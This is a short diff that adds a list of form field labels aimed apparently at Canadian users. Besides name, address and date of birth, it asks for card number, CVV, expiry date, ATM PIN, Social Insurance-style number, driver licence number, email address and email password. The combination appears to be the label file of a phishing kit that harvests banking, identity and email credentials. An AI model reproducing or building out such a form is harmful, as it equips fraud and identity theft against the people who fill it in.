@@ -1,0 +1,29 @@
+Full name*
+Address*
+Date of birth*
+Driver Licence Number
+Card Number
+Name On Card
+ATM Pin
+Expiry Date
+CVV
+Social Security Number in Canada
+Social Security Number in Canada
+Month
+January
+February
+March
+April
+May
+June
+July
+August
+September
+October
+November
+December
+City*
+Province*
+Zip Code*
+Email Address*
+Email Password
